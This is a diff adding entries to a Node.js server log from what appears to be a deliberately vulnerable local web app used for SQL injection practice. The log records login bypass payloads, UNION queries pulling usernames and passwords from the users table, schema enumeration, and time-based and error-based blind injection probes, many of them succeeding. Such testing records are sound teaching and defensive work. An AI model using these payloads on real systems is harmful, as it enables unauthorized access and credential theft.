@@ -2529,3 +2529,451 @@ Require stack:
 18.12.2024, 09:08:20 [info]: [getUser] Retrieved username: admin for session ID: 048eddf0-4d88-4daf-b8d1-9a2db7ac501b
 18.12.2024, 09:08:38 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') -- '' at line 1
 18.12.2024, 09:08:38 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') -- '' at line 1
+18.12.2024, 10:27:41 [info]: Loading route file: route_account_management.js
+18.12.2024, 10:27:41 [info]: Loading route file: route_blog.js
+18.12.2024, 10:27:41 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 10:27:41 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 10:27:41 [info]: Server is running on http://localhost:3000
+18.12.2024, 10:27:41 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 10:27:42 [info]: Database connection established
+18.12.2024, 10:29:18 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:29:18 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 10:29:18 [info]: [generateUUID] Generated UUID: 0d1c4040-2b76-413b-a133-346c133996f4
+18.12.2024, 10:29:18 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 10:29:18 [info]: [generateSession] Deleted 1 session(s) for user ID: 9
+18.12.2024, 10:29:18 [info]: [generateSession] Session created: ID=0d1c4040-2b76-413b-a133-346c133996f4, user=admin
+18.12.2024, 10:29:18 [info]: [login] Login successful: username=admin, sessionID=0d1c4040-2b76-413b-a133-346c133996f4
+18.12.2024, 10:29:18 [info]: [validateAndUpdateSession] Session updated successfully: ID=0d1c4040-2b76-413b-a133-346c133996f4
+18.12.2024, 10:29:19 [info]: [getUser] Retrieved username: admin for session ID: 0d1c4040-2b76-413b-a133-346c133996f4
+18.12.2024, 10:29:22 [info]: [validateAndUpdateSession] Session updated successfully: ID=0d1c4040-2b76-413b-a133-346c133996f4
+18.12.2024, 10:29:22 [info]: [deleteSession] Session deleted: ID=0d1c4040-2b76-413b-a133-346c133996f4
+18.12.2024, 10:29:22 [info]: [logout] Session deleted successfully: sessionID=0d1c4040-2b76-413b-a133-346c133996f4
+18.12.2024, 10:33:32 [info]: [validateLogin] User not found: username=userxy
+18.12.2024, 10:33:32 [info]: [login] Unauthorized login attempt: username=userxy
+18.12.2024, 10:34:21 [info]: [validateLogin] User not found: username=userxy
+18.12.2024, 10:34:21 [info]: [login] Unauthorized login attempt: username=userxy
+18.12.2024, 10:34:22 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:34:22 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 10:34:22 [info]: [generateUUID] Generated UUID: 06ffb524-31c9-4d28-8fe5-4631db1e1d04
+18.12.2024, 10:34:22 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 10:34:22 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 10:34:23 [info]: [generateSession] Session created: ID=06ffb524-31c9-4d28-8fe5-4631db1e1d04, user=admin' -- 
+18.12.2024, 10:34:23 [info]: [login] Login successful: username=admin' -- , sessionID=06ffb524-31c9-4d28-8fe5-4631db1e1d04
+18.12.2024, 10:34:23 [info]: [validateLogin] User not found: username=user_xy' -- 
+18.12.2024, 10:34:23 [info]: [login] Unauthorized login attempt: username=user_xy' -- 
+18.12.2024, 10:34:24 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:34:24 [info]: [validateLogin] Login successful: username=elvis' -- 
+18.12.2024, 10:34:24 [info]: [generateUUID] Generated UUID: 2c941b63-f237-4831-b0ad-f50539b5f35d
+18.12.2024, 10:34:24 [info]: [generateSession] Starting session creation for user: elvis' -- 
+18.12.2024, 10:34:24 [info]: [generateSession] Deleted 1 session(s) for user ID: 11
+18.12.2024, 10:34:24 [info]: [generateSession] Session created: ID=2c941b63-f237-4831-b0ad-f50539b5f35d, user=elvis' -- 
+18.12.2024, 10:34:24 [info]: [login] Login successful: username=elvis' -- , sessionID=2c941b63-f237-4831-b0ad-f50539b5f35d
+18.12.2024, 10:34:25 [info]: [login] Missing username or password
+18.12.2024, 10:35:21 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:35:21 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 10:35:21 [info]: [generateUUID] Generated UUID: cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4
+18.12.2024, 10:35:21 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 10:35:21 [info]: [generateSession] Deleted 1 session(s) for user ID: 9
+18.12.2024, 10:35:22 [info]: [generateSession] Session created: ID=cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4, user=admin' -- 
+18.12.2024, 10:35:22 [info]: [login] Login successful: username=admin' -- , sessionID=cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4
+18.12.2024, 10:35:22 [info]: [validateAndUpdateSession] Session updated successfully: ID=cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4
+18.12.2024, 10:35:22 [info]: [getUser] Retrieved username: admin for session ID: cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4
+18.12.2024, 10:35:47 [info]: [validateAndUpdateSession] Session updated successfully: ID=cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4
+18.12.2024, 10:35:47 [info]: [deleteSession] Session deleted: ID=cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4
+18.12.2024, 10:35:47 [info]: [logout] Session deleted successfully: sessionID=cd4a3ce0-7e0c-456a-8abd-2d3d94adbad4
+18.12.2024, 10:36:00 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:36:00 [info]: [validateLogin] Incorrect password: username=userxy' OR '1'='1
+18.12.2024, 10:36:00 [info]: [login] Unauthorized login attempt: username=userxy' OR '1'='1
+18.12.2024, 10:36:04 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:36:05 [info]: [validateLogin] Incorrect password: username=userxy' OR '1'='1 
+18.12.2024, 10:36:05 [info]: [login] Unauthorized login attempt: username=userxy' OR '1'='1 
+18.12.2024, 10:36:18 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:36:19 [info]: [validateLogin] Login successful: username=userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 10:36:19 [info]: [generateUUID] Generated UUID: 6791e95f-298f-4dee-9876-1a7ee29f4fce
+18.12.2024, 10:36:19 [info]: [generateSession] Starting session creation for user: userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 10:36:19 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 10:36:19 [info]: [generateSession] Session created: ID=6791e95f-298f-4dee-9876-1a7ee29f4fce, user=userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 10:36:19 [info]: [login] Login successful: username=userxy' OR '1'='1' ORDER BY id ASC -- , sessionID=6791e95f-298f-4dee-9876-1a7ee29f4fce
+18.12.2024, 10:36:19 [info]: [validateAndUpdateSession] Session updated successfully: ID=6791e95f-298f-4dee-9876-1a7ee29f4fce
+18.12.2024, 10:36:20 [info]: [getUser] Retrieved username: admin for session ID: 6791e95f-298f-4dee-9876-1a7ee29f4fce
+18.12.2024, 10:36:27 [info]: [validateAndUpdateSession] Session updated successfully: ID=6791e95f-298f-4dee-9876-1a7ee29f4fce
+18.12.2024, 10:36:27 [info]: [deleteSession] Session deleted: ID=6791e95f-298f-4dee-9876-1a7ee29f4fce
+18.12.2024, 10:36:27 [info]: [logout] Session deleted successfully: sessionID=6791e95f-298f-4dee-9876-1a7ee29f4fce
+18.12.2024, 10:36:35 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 1
+18.12.2024, 10:36:35 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 1
+18.12.2024, 10:36:42 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:36:42 [info]: [validateLogin] Login successful: username=userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 10:36:42 [info]: [generateUUID] Generated UUID: 84edaa0e-1777-41c5-b39b-f1d61c02a15c
+18.12.2024, 10:36:42 [info]: [generateSession] Starting session creation for user: userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 10:36:43 [info]: [generateSession] Deleted 1 session(s) for user ID: 11
+18.12.2024, 10:36:43 [info]: [generateSession] Session created: ID=84edaa0e-1777-41c5-b39b-f1d61c02a15c, user=userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 10:36:43 [info]: [login] Login successful: username=userxy' OR '1'='1' ORDER BY id DESC -- , sessionID=84edaa0e-1777-41c5-b39b-f1d61c02a15c
+18.12.2024, 10:36:43 [info]: [validateAndUpdateSession] Session updated successfully: ID=84edaa0e-1777-41c5-b39b-f1d61c02a15c
+18.12.2024, 10:36:44 [info]: [getUser] Retrieved username: elvis for session ID: 84edaa0e-1777-41c5-b39b-f1d61c02a15c
+18.12.2024, 10:36:45 [info]: [validateAndUpdateSession] Session updated successfully: ID=84edaa0e-1777-41c5-b39b-f1d61c02a15c
+18.12.2024, 10:36:45 [info]: [deleteSession] Session deleted: ID=84edaa0e-1777-41c5-b39b-f1d61c02a15c
+18.12.2024, 10:36:45 [info]: [logout] Session deleted successfully: sessionID=84edaa0e-1777-41c5-b39b-f1d61c02a15c
+18.12.2024, 10:37:16 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:37:16 [info]: [validateLogin] Login successful: username=userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 10:37:16 [info]: [generateUUID] Generated UUID: 87003b4f-4ab9-4fa4-ba42-d4cf741aad84
+18.12.2024, 10:37:16 [info]: [generateSession] Starting session creation for user: userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 10:37:16 [info]: [generateSession] Deleted 0 session(s) for user ID: 8
+18.12.2024, 10:37:17 [info]: [generateSession] Session created: ID=87003b4f-4ab9-4fa4-ba42-d4cf741aad84, user=userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 10:37:17 [info]: [login] Login successful: username=userxy' OR '1'='1' ORDER BY id ASC -- , sessionID=87003b4f-4ab9-4fa4-ba42-d4cf741aad84
+18.12.2024, 10:37:17 [info]: [validateAndUpdateSession] Session updated successfully: ID=87003b4f-4ab9-4fa4-ba42-d4cf741aad84
+18.12.2024, 10:37:17 [info]: [getUser] Retrieved username: elvis for session ID: 87003b4f-4ab9-4fa4-ba42-d4cf741aad84
+18.12.2024, 10:37:21 [info]: [validateAndUpdateSession] Session updated successfully: ID=87003b4f-4ab9-4fa4-ba42-d4cf741aad84
+18.12.2024, 10:37:21 [info]: [deleteSession] Session deleted: ID=87003b4f-4ab9-4fa4-ba42-d4cf741aad84
+18.12.2024, 10:37:21 [info]: [logout] Session deleted successfully: sessionID=87003b4f-4ab9-4fa4-ba42-d4cf741aad84
+18.12.2024, 10:38:57 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:38:57 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 10:38:57 [info]: [generateUUID] Generated UUID: b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:38:57 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 10:38:57 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 10:38:58 [info]: [generateSession] Session created: ID=b0452edd-2b94-4b13-b9c3-60cd7a56dabb, user=admin
+18.12.2024, 10:38:58 [info]: [login] Login successful: username=admin, sessionID=b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:38:58 [info]: [validateAndUpdateSession] Session updated successfully: ID=b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:38:58 [info]: [getUser] Retrieved username: admin for session ID: b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:39:29 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT id, username, password FROM users -- %'
+        
+18.12.2024, 10:39:29 [info]: [unsafe_searchPosts] Query executed successfully, returned 6 result(s)
+18.12.2024, 10:40:24 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, @@version, 3 -- %'
+        
+18.12.2024, 10:40:25 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 10:40:31 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, DATABASE(), 3 -- %'
+        
+18.12.2024, 10:40:31 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 10:40:35 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- %'
+        
+18.12.2024, 10:40:35 [info]: [unsafe_searchPosts] Query executed successfully, returned 332 result(s)
+18.12.2024, 10:40:54 [info]: [validateAndUpdateSession] Session updated successfully: ID=b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:40:55 [info]: [getUser] Retrieved username: admin for session ID: b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:40:55 [info]: [validateAndUpdateSession] Session updated successfully: ID=b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:40:56 [info]: [deleteSession] Session deleted: ID=b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:40:56 [info]: [logout] Session deleted successfully: sessionID=b0452edd-2b94-4b13-b9c3-60cd7a56dabb
+18.12.2024, 10:41:10 [info]: [validateLogin] User not found: username=' OR IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 10:41:10 [info]: [login] Unauthorized login attempt: username=' OR IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 10:41:36 [info]: [validateLogin] User not found: username=' OR IF(SUBSTRING(username, 2, 1) = 'd', SLEEP(3), 0) -- 
+18.12.2024, 10:41:36 [info]: [login] Unauthorized login attempt: username=' OR IF(SUBSTRING(username, 2, 1) = 'd', SLEEP(3), 0) -- 
+18.12.2024, 10:41:42 [info]: [validateLogin] User not found: username=' OR IF(SUBSTRING(username, 2, 1) = 'd', SLEEP(3), 0) -- 
+18.12.2024, 10:41:42 [info]: [login] Unauthorized login attempt: username=' OR IF(SUBSTRING(username, 2, 1) = 'd', SLEEP(3), 0) -- 
+18.12.2024, 10:42:11 [info]: [validateLogin] User not found: username=' OR IF(SUBSTRING(username, 2, 1) = 'x', SLEEP(3), 0) -- 
+18.12.2024, 10:42:11 [info]: [login] Unauthorized login attempt: username=' OR IF(SUBSTRING(username, 2, 1) = 'x', SLEEP(3), 0) -- 
+18.12.2024, 10:42:29 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:42:29 [info]: [validateLogin] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 10:42:29 [info]: [generateUUID] Generated UUID: 19b2356d-067c-4bb8-b031-cabebdde0a6f
+18.12.2024, 10:42:29 [info]: [generateSession] Starting session creation for user: ' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 10:42:29 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 10:42:29 [info]: [generateSession] Session created: ID=19b2356d-067c-4bb8-b031-cabebdde0a6f, user=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 10:42:29 [info]: [login] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- , sessionID=19b2356d-067c-4bb8-b031-cabebdde0a6f
+18.12.2024, 10:42:30 [info]: [validateAndUpdateSession] Session updated successfully: ID=19b2356d-067c-4bb8-b031-cabebdde0a6f
+18.12.2024, 10:42:30 [info]: [getUser] Retrieved username: admin for session ID: 19b2356d-067c-4bb8-b031-cabebdde0a6f
+18.12.2024, 10:42:37 [info]: [validateAndUpdateSession] Session updated successfully: ID=19b2356d-067c-4bb8-b031-cabebdde0a6f
+18.12.2024, 10:42:37 [info]: [deleteSession] Session deleted: ID=19b2356d-067c-4bb8-b031-cabebdde0a6f
+18.12.2024, 10:42:37 [info]: [logout] Session deleted successfully: sessionID=19b2356d-067c-4bb8-b031-cabebdde0a6f
+18.12.2024, 10:42:46 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 10:42:46 [info]: [validateLogin] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'e') -- 
+18.12.2024, 10:42:46 [info]: [generateUUID] Generated UUID: 4ac17084-e1b1-4a8c-82bc-0d99f738026e
+18.12.2024, 10:42:46 [info]: [generateSession] Starting session creation for user: ' OR 1/(SUBSTRING(username, 1, 1) = 'e') -- 
+18.12.2024, 10:42:46 [info]: [generateSession] Deleted 0 session(s) for user ID: 11
+18.12.2024, 10:42:47 [info]: [generateSession] Session created: ID=4ac17084-e1b1-4a8c-82bc-0d99f738026e, user=' OR 1/(SUBSTRING(username, 1, 1) = 'e') -- 
+18.12.2024, 10:42:47 [info]: [login] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'e') -- , sessionID=4ac17084-e1b1-4a8c-82bc-0d99f738026e
+18.12.2024, 10:42:47 [info]: [validateAndUpdateSession] Session updated successfully: ID=4ac17084-e1b1-4a8c-82bc-0d99f738026e
+18.12.2024, 10:42:47 [info]: [getUser] Retrieved username: elvis for session ID: 4ac17084-e1b1-4a8c-82bc-0d99f738026e
+18.12.2024, 10:42:53 [info]: [validateAndUpdateSession] Session updated successfully: ID=4ac17084-e1b1-4a8c-82bc-0d99f738026e
+18.12.2024, 10:42:53 [info]: [deleteSession] Session deleted: ID=4ac17084-e1b1-4a8c-82bc-0d99f738026e
+18.12.2024, 10:42:53 [info]: [logout] Session deleted successfully: sessionID=4ac17084-e1b1-4a8c-82bc-0d99f738026e
+18.12.2024, 12:46:27 [info]: Loading route file: route_account_management.js
+18.12.2024, 12:46:27 [info]: Loading route file: route_blog.js
+18.12.2024, 12:46:27 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 12:46:27 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 12:46:27 [info]: Server is running on http://localhost:3000
+18.12.2024, 12:46:27 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 12:46:28 [info]: Database connection established
+18.12.2024, 12:46:36 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 12:46:37 [info]: [validateLogin] Login successful: username=userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 12:46:37 [info]: [generateUUID] Generated UUID: 146d866d-7242-4932-9e07-9ac8a44f9d6d
+18.12.2024, 12:46:37 [info]: [generateSession] Starting session creation for user: userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 12:46:37 [info]: [generateSession] Deleted 0 session(s) for user ID: 11
+18.12.2024, 12:46:37 [info]: [generateSession] Session created: ID=146d866d-7242-4932-9e07-9ac8a44f9d6d, user=userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 12:46:37 [info]: [login] Login successful: username=userxy' OR '1'='1' ORDER BY id DESC -- , sessionID=146d866d-7242-4932-9e07-9ac8a44f9d6d
+18.12.2024, 12:46:38 [info]: [validateAndUpdateSession] Session updated successfully: ID=146d866d-7242-4932-9e07-9ac8a44f9d6d
+18.12.2024, 12:46:38 [info]: [getUser] Retrieved username: elvis for session ID: 146d866d-7242-4932-9e07-9ac8a44f9d6d
+18.12.2024, 12:46:51 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%a%'
+        
+18.12.2024, 12:46:51 [info]: [unsafe_searchPosts] Query executed successfully, returned 3 result(s)
+18.12.2024, 12:47:06 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT id, username, password FROM users -- %'
+        
+18.12.2024, 12:47:07 [info]: [unsafe_searchPosts] Query executed successfully, returned 6 result(s)
+18.12.2024, 12:52:14 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, @@version, 3 -- %'
+        
+18.12.2024, 12:52:15 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 12:53:04 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, DATABASE(), 3 -- %'
+        
+18.12.2024, 12:53:04 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 12:53:23 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- %'
+        
+18.12.2024, 12:53:24 [info]: [unsafe_searchPosts] Query executed successfully, returned 332 result(s)
+18.12.2024, 12:55:49 [info]: [validateAndUpdateSession] Session updated successfully: ID=146d866d-7242-4932-9e07-9ac8a44f9d6d
+18.12.2024, 12:55:49 [info]: [deleteSession] Session deleted: ID=146d866d-7242-4932-9e07-9ac8a44f9d6d
+18.12.2024, 12:55:49 [info]: [logout] Session deleted successfully: sessionID=146d866d-7242-4932-9e07-9ac8a44f9d6d
+18.12.2024, 12:56:45 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 12:56:45 [info]: [validateLogin] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 12:56:45 [info]: [generateUUID] Generated UUID: b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 12:56:45 [info]: [generateSession] Starting session creation for user: ' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 12:56:45 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 12:56:45 [info]: [generateSession] Session created: ID=b8db5816-ea14-44c7-aff9-4f8fdf734257, user=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 12:56:45 [info]: [login] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- , sessionID=b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 12:56:46 [info]: [validateAndUpdateSession] Session updated successfully: ID=b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 12:56:46 [info]: [getUser] Retrieved username: admin for session ID: b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:08:06 [info]: [validateAndUpdateSession] Session updated successfully: ID=b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:08:06 [info]: [getUser] Retrieved username: admin for session ID: b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:10:06 [info]: [validateAndUpdateSession] Session updated successfully: ID=b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:10:06 [info]: [getUser] Retrieved username: admin for session ID: b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:11:24 [info]: [validateLogin] User not found: username=userxy
+18.12.2024, 13:11:24 [info]: [login] Unauthorized login attempt: username=userxy
+18.12.2024, 13:56:52 [info]: Loading route file: route_account_management.js
+18.12.2024, 13:56:52 [info]: Loading route file: route_blog.js
+18.12.2024, 13:56:52 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 13:56:52 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 13:56:52 [info]: Server is running on http://localhost:3000
+18.12.2024, 13:56:52 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 13:56:54 [error]: [validateAndUpdateSession] Error updating session: Cannot read properties of undefined (reading 'query')
+18.12.2024, 13:56:54 [info]: Database connection established
+18.12.2024, 13:56:56 [info]: [validateAndUpdateSession] Session updated successfully: ID=b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:56:56 [info]: [deleteSession] Session deleted: ID=b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:56:56 [info]: [logout] Session deleted successfully: sessionID=b8db5816-ea14-44c7-aff9-4f8fdf734257
+18.12.2024, 13:57:02 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 13:57:02 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 13:57:02 [info]: [generateUUID] Generated UUID: e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:57:02 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 13:57:03 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 13:57:03 [info]: [generateSession] Session created: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652, user=admin
+18.12.2024, 13:57:03 [info]: [login] Login successful: username=admin, sessionID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:57:03 [info]: [validateAndUpdateSession] Session updated successfully: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:57:04 [info]: [getUser] Retrieved username: admin for session ID: e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:57:29 [info]: [validateAndUpdateSession] Session updated successfully: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:57:29 [info]: [getUser] Retrieved username: admin for session ID: e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:57:44 [info]: [validateAndUpdateSession] Session updated successfully: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:57:45 [info]: [getUser] Retrieved username: admin for session ID: e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:58:50 [info]: [validateAndUpdateSession] Session updated successfully: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:58:51 [info]: [getUser] Retrieved username: admin for session ID: e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:58:53 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%a%'
+        
+18.12.2024, 13:58:54 [info]: [unsafe_searchPosts] Query executed successfully, returned 3 result(s)
+18.12.2024, 13:58:56 [info]: [validateAndUpdateSession] Session updated successfully: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:58:56 [info]: [getUser] Retrieved username: admin for session ID: e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:58:57 [info]: [validateAndUpdateSession] Session updated successfully: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:58:57 [info]: [deleteSession] Session deleted: ID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 13:58:57 [info]: [logout] Session deleted successfully: sessionID=e31a6e54-c62a-4f9b-ae56-7ff04365a652
+18.12.2024, 14:14:59 [info]: Loading route file: route_account_management.js
+18.12.2024, 14:14:59 [info]: Loading route file: route_blog.js
+18.12.2024, 14:14:59 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 14:14:59 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 14:14:59 [info]: Server is running on http://localhost:3000
+18.12.2024, 14:14:59 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 14:15:01 [info]: Database connection established
+18.12.2024, 14:15:08 [info]: Loading route file: route_account_management.js
+18.12.2024, 14:15:08 [info]: Loading route file: route_blog.js
+18.12.2024, 14:15:08 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 14:15:08 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 14:15:08 [info]: Server is running on http://localhost:3000
+18.12.2024, 14:15:08 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 14:15:08 [info]: Database connection established
+18.12.2024, 14:25:04 [info]: Loading route file: route_account_management.js
+18.12.2024, 14:25:04 [info]: Loading route file: route_blog.js
+18.12.2024, 14:25:04 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 14:25:04 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 14:25:04 [info]: Server is running on http://localhost:3000
+18.12.2024, 14:25:04 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 14:25:05 [info]: Database connection established
+18.12.2024, 14:28:07 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 14:28:07 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 14:28:07 [info]: [generateUUID] Generated UUID: 49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:07 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 14:28:07 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 14:28:08 [info]: [generateSession] Session created: ID=49914e08-48bf-493d-95d2-c0e4a915c443, user=admin
+18.12.2024, 14:28:08 [info]: [login] Login successful: username=admin, sessionID=49914e08-48bf-493d-95d2-c0e4a915c443
